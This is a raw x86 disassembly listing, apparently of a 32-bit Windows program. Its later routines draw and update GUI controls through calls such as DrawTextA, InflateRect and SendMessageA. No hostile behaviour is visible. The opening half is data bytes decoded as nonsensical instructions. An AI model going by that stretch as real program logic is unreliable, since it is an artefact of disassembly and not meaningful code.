add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
inc ecx
add [ ecx + edi ] bl
insd
push ebx
je r-xdata
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
dec edx
inc ebx
add [ ebp + eax * 2 + 0x44 ] bl
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov al [ 0x3004306 ]
adc dl [ ebx + edx * 2 + 0x74 ]
popad
je r-xdata
add bh bh
or al 0x92
add [ eax ] dl
inc eax
add [ ecx ] cl
add al [ eax ]
[ eax + eax ]
outsb
insd
outsb
je r-xdata
arpl [ ebp + 0x78 ] dx
je r-xdata
adc al 0xe9
je r-xdata
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al cl
inc edi
inc ebx
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add ah al
dec edx
inc ebx
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
insb
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
fild [ ebx ]
adc al 0xe9
arpl [ edx + 0x6f ] ax
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
[ eax + 0x1004491 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
fiadd [ ebx ]
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
fcom [ ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
str [ edx ]
inc edx
jbe r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
add [ 0x6e410700 ] cl
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
int 0x43
or [ ebx ] eax
pop es
or edx [ ebx + edx * 2 + 0x74 ]
popad
je r-xdata
arpl [ ebp + 0x78 ] dx
je r-xdata
jb r-xdata
inc ebx
jb r-xdata
add [ eax + 0x43070015 ] al
popad
jo r-xdata
insb
dec edi
jne r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
add [ ecx + edx + 0x44 ] dl
add [ eax ] al
arpl [ ebp + 0x78 ] dx
je r-xdata
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax ] bh
dec eax
inc ebx
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ ebx ] al
add [ esi ] al
mov al 0xe
mov al 0x12
mov al 0xb8
dec eax
inc ebx
add [ ecx + ecx * 2 + 0x43 ] dl
add [ eax + 0x49 ] ch
inc ebx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
shl [ eax + ecx ] 0x43
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add al bh
pop es
inc ebx
add [ eax + ecx ] cl
inc ebx
je r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ edi + 0x6e ] sub_41f844
jo r-xdata
inc [ edi + ebx ]
jb r-xdata
add [ edi ] bl
add bh bh
jo r-xdata
fiadd [ ebx ]
arpl [ ecx ] ax
add bh bh
cwde
xchg ecx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax ] bh
dec eax
inc ebx
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ ebx ] cl
push esp
push ebx
je r-xdata
inc esp
add al bh
add [ eax + eax + 0x74 ] 0x83
inc esp
or [ ebx ] al
and [ eax ] cl
inc ebx
add [ eax + eax ] dh
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ edx + ebp * 2 + 0x49840041 ] al
inc ebx
add [ eax + 0x5c00434a ] al
inc ebp
inc esp
outsd
insd
push ebx
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + eax + 0x73070043 ] bl
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : ebx + 0x62 ] esi
jae r-xdata
add [ eax ] al
add [ edx ] bl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x43c65073
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] al
xor ah 0xff
insb
inc esp
add [ eax ] ah
pop ds
add bh bh
add al 0x1f
movsb [ edi ] gs : [ esi ]
int3
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x16800000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xor eax [ ecx ]
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
push es
inc ebx
add [ edx ] cl
add al [ eax ]
insb
dec ecx
outsb
outsb
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
add [ eax - 0x63ffbbbd ] bh
pop [ eax + eax + 0x60 ]
pop eax
inc eax
je r-xdata
cmp [ eax ] eax
cwde
pushad
inc esp
add [ eax + 0x36 ] bl
inc eax
imul ebp [ esi + 0x67 ] 0x7309656c
bound esi [ ebx + 0x53 ]
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ ecx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
fild [ ebx ]
add [ gs : eax ] eax
dec [ edx + edx * 4 ]
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
adc al 0xcd
inc ebx
mov al 0x4a
inc ebx
add [ ecx ] al
add [ eax - 0x3a ] ch
inc ebx
add [ ebx ] bl
add bh bh
js r-xdata
inc esp
add [ eax + 0x58 ] ah
arpl [ ebp + 0x78 ] dx
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
push eax
dec edx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c001c ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jae r-xdata
insb
imul esp [ edi + 0x6e ] r-xdata
or [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add al 0x33
inc ecx
add [ eax ] cl
add al [ eax ]
push [ eax + 0x100434a ]
pop esp
or [ ebx ] eax
sbb [ edx ] al
add [ eax ] al
call 0x14434b7f
jmp 0x395708bf
pop es
inc ebx
add [ eax - 0x21 ] dl
inc ebx
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or dl [ eax + 0x61 ]
jb r-xdata
outsd
insb
in al 0xfc
inc ecx
add [ eax ] ch
add bh bh
pop eax
push ds
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add bh bh
jb r-xdata
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
dec edx
inc ebx
add [ ebp + eax * 2 + 0x44 ] bl
inc ebx
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push eax
fild [ ebx ]
or al 0x2
int3
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al cl
inc edi
inc ebx
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add ah al
dec edx
inc ebx
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
insb
jae r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
int3
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
add [ eax + 0x4308 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx + 0x43 ] bl
add [ eax ] bl
add al [ eax ]
add al ch
push es
inc ebx
add [ ecx + ebp * 8 ] dl
jo r-xdata
add bh bh
sbb al 0x1d
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090022 ] al
outsd
inc eax
add [ ecx + eax - 0x79470100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ es : edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc [ esp + ebx + 0x3dfc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
xor al 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
push 0x6948776f
outsb
outsb
and eax [ eax ]
or eax 0x776f6853
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
adc [ eax ] al
adc [ edx ] al
add bh bh
add al 0x4b
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc eax
add [ ecx - 0x4b010000 ] bl
push ds
inc esp
add [ esi + ebx + 0x44 ] bh
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
je r-xdata
outsb
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
sub_43107c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449fd8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_441520
mov edx 0x69
mov eax esi
call sub_441544
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4310d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4445d4
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_422408
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_422364
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_431144
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x18 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_431333
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_422408
mov edx r-xdata
mov eax edi
call sub_422364
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_414b64
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
mov edx 0x80000006
mov eax [ edi + 0x14 ]
call sub_421ce0
inc [ ebp - 0x14 ]
inc [ ebp - 0x10 ]
mov edx 0x80000014
mov eax [ edi + 0x14 ]
call sub_421ce0
lea edx [ ebp - 0x14 ]
mov eax edi
call sub_4220c0
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call OffsetRect
mov edx 0x80000010
mov eax [ edi + 0x14 ]
call sub_421ce0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43133a
lea eax [ ebp - 0x3c ]
mov edx 0x5
call sub_404450
lea eax [ ebp - 0x18 ]
call sub_40442c
retn
mov eax ebx
mov si 0xffc8
call sub_4038bc
test al al
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax edi
call sub_4220c0
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_441d64
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_441d64
mov edx [ ebp - 0x2c ]
mov eax [ ebx + 0x208 ]
call sub_422348
push eax
mov eax [ ebp - 0xc ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_414b64
push edi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_414b64
jmp r-xdata
mov edx 0x20
mov eax ebx
call sub_444060
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x30 ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x30 ]
call sub_4046e4
push eax
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x34 ]
call sub_4048dc
push eax
mov eax edi
call sub_4224e8
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_421ce0
push esi
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x38 ]
call sub_4046e4
push eax
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x3c ]
call sub_4048dc
push eax
mov eax edi
call sub_4224e8
push eax
call DrawTextA
sub_431347
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4313c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_441d64
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45925c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_447954
mov eax ebx
mov si 0xffb8
call sub_4038bc
test al al
je r-xdata
mov eax ebx
call sub_4489e4
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4313c9
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_431414
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4495c8
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_441520
mov edx 0x11
mov eax esi
call sub_441544
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_431494
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4315ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444060
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_422408
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4046ec
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4046e4
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x160 ]
call sub_4224e8
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0x80000014
call sub_421514
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4046e4
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x160 ]
call sub_4224e8
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0x80000010
call sub_421514
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4046e4
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x160 ]
call sub_4224e8
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4315f1
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_4315fb
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_431824
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_421dfc
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_421ce0
xor edx edx
mov eax [ esi + 0x14 ]
call sub_421dfc
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_422084
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_4038bc
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_4038bc
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_43171c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_422568
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_4038bc
xor edx edx
mov eax [ edi + 0x160 ]
call sub_422568
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_4038bc
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43eb7c
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_431860
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_431824
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4318bc
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_4038bc
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4318e4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441234
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_431948
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4319d5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4319dc
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_441d64
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45925c
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_4038bc
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
mov [ edi + 0xc ] 0x1
sub_431a2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444294
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_441520
mov edx 0x19
mov eax esi
call sub_441544
mov dl 0x1
mov eax esi
call sub_4486b8
xor edx edx
mov eax esi
call sub_441f28
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_432158
mov eax esi
test bl bl
je r-xdata
sub_431ad4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431b54
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_448788
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc4 ]
sub_431b98
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_448484
push eax
call SendMessageA
test eax eax
setne bl
sub_431bd0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_448788
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_448484
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431c08
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_431c85
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
